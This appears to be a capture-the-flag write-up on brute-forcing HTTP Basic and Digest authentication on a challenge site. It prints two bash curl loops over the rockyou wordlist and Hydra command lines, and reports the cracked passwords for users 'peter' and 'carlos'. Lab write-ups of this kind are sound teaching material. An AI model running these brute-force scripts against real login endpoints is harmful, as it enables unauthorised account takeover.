# SPIROS (BASIC & Digest auth)

## Challenge: 

![challenge description-basic](img/auth/basic%20auth.png)

![chalenge description-digest](img/auth/digest%20auth.png)

## Solution (Basic auth):
This challenge requires us to use either a bash script or [Hydra](https://github.com/gnebbia/hydra_notes#http-basic-authentication) to brute force the password for the user named "peter".     

Below is the bash script that I created to brute force for the password.

```
#!/bin/bash

for p in $(cat /usr/share/wordlists/rockyou.txt)
do
	echo $p
	curl -u peter:$p https://www.spiros.ml/auth/basic.php
done
```

Running the command `./script.sh | grep -v "Incorrect username or password." | grep -v "You need to enter a valid username and p
assword."`, I obtained the password to be "michelle".

![Basic Bash password found](img/auth/basic%20bash%20pw.png)

We could also brute force for the password using Hydra. Running the command `hydra -l "peter" -P /usr/share/wordlists/rockyou.txt www.spiros.ml http-head /auth/basic.php -S`, I obtained the same password.
> For HTTP sites, omit the -S switch

![pw found by hydra](img/auth/pw%20found%20by%20hydra.png)

## Solution (Digest auth):
This challenge requires us to use either a bash script or [Hydra](https://github.com/gnebbia/hydra_notes#http-basic-authentication) to brute force the password for the user named "carlos". 

Using the following bash script, I was able to bruteforce the password.
```
#!/bin/bash

for p in $(cat /usr/share/wordlists/rockyou.txt)
do
	echo $p
	curl --digest -u carlos:$p https://www.spiros.ml/auth/digest.php 
done
```

The result of running `./digest_script.sh` gave us the password as "superman".

![pw for digest bash](img/auth/bash%20digest%20pw.png)

We could also use Hydra to obtain the same password, by running the command `hydra -l "carlos" -P /usr/share/wordlists/rockyou.txt www.spiros.ml http-get /auth/digest.php -S`.

![hydra digest pw](img/auth/hydra%20digest%20pw.png)